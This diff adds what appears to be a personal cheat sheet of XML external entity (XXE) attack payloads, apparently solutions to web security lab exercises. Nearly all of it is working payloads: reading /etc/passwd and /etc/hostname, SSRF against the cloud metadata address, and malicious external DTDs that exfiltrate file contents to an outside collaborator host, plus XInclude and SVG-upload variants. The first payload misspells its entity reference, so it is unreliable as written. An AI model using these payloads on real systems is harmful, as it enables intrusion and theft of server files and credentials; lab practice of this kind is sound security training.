@@ -1,0 +1,85 @@
+Exploiting XXE to retrieve files:
+-------------------------------------
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+&xee;
+
+
+Exploiting XXE to perform SSRF attacks:
+------------------------------------------
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+&xxe;
+
+
+Blind XXE with out-of-band interaction:
+------------------------------------------
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://1y0c0y4kefw5uuz04f7jbu47mysogd.oastify.com"> ]>
+&xxe;
+
+
+Blind XXE with out-of-band interaction via XML parameter entities:
+----------------------------------------------------------------------
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://1y0c0y4kefw5uuz04f7jbu47mysogd.oastify.com"> %xxe; ]>
+
+
+Exploiting blind XXE to exfiltrate data using a malicious external DTD:
+--------------------------------------------------------------------------
+Click "Go to exploit server" and save the following malicious DTD file on your server:  
+	<!ENTITY % file SYSTEM "file:///etc/hostname">
+	<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://1qsa0dewklw6bu2jyapp84g3dujk79.oastify.com/?x=%file;'>">
+	%eval;
+	%exfil;
+
+Insert the following external entity definition in between the XML declaration and the stockCheck element:
+	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a5e004104ddd4a6833a82c001930095.exploit-server.net/exploit.dtd"> %xxe;]>
+
+
+
+Exploiting blind XXE to retrieve data via error messages:
+--------------------------------------------------------------
+Click "Go to exploit server" and save the following malicious DTD file on your server: 
+	<!ENTITY % file SYSTEM "file:///etc/passwd">
+	<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+	%eval;
+	%exfil;
+
+Insert the following external entity definition in between the XML declaration and the stockCheck element:
+	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a800046046f5f7080a225d7018f000a.exploit-server.net/exploit.dtd"> %xxe;]>
+
+
+
+
+Exploiting XXE to retrieve data by repurposing a local DTD:
+-------------------------------------------------------------
+Insert the following parameter entity definition in between the XML declaration and the stockCheck element: 
+	<!DOCTYPE message [
+	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+	<!ENTITY % ISOamso '
+	<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+	<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+	&#x25;eval;
+	&#x25;error;
+	'>
+	%local_dtd;
+	]>	
+
+
+
+XInclude attacks:
+-------------------
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+
+
+Exploiting XInclude to retrieve files:
+----------------------------------------
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+
+
+Exploiting XXE via image file upload:
+---------------------------------------
+Create a local SVG image with the following content: 
+	<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+
